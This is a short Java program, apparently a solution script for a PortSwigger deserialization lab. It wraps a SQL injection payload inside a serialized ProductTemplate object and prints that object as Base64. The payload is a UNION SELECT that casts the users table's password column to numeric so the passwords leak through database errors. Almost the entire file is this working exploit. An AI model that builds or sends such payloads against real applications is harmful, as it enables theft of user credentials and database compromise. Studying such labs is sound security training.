// copied from: https://github.com/PortSwigger/serialization-examples/tree/master/java/generic

import data.productcatalog.ProductTemplate;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.Base64;

class Main {
    public static void main(String[] args) throws Exception {
//        Foo fooObject = new Foo("str", 123);
        ProductTemplate pT = new ProductTemplate("' UNION SELECT NULL, NULL, NULL, CAST(password AS numeric), NULL, NULL, NULL, NULL FROM users--");

        String serializedObject = serialize(pT);

        System.out.println(serializedObject);
        // System.out.println("Serialized object: \n" + serializedObject);

//        Foo deserializedObject = deserialize(serializedObject);
//        System.out.println("Deserialized data str: " + deserializedObject.str + ", num: " + deserializedObject.num);
    }

    private static String serialize(Serializable obj) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream(512);
        try (ObjectOutputStream out = new ObjectOutputStream(baos)) {
            out.writeObject(obj);
        }
        return Base64.getEncoder().encodeToString(baos.toByteArray());
    }

    private static <T> T deserialize(String base64SerializedObj) throws Exception {
        try (ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(base64SerializedObj)))) {
            @SuppressWarnings("unchecked")
            T obj = (T) in.readObject();
            return obj;
        }
    }
}
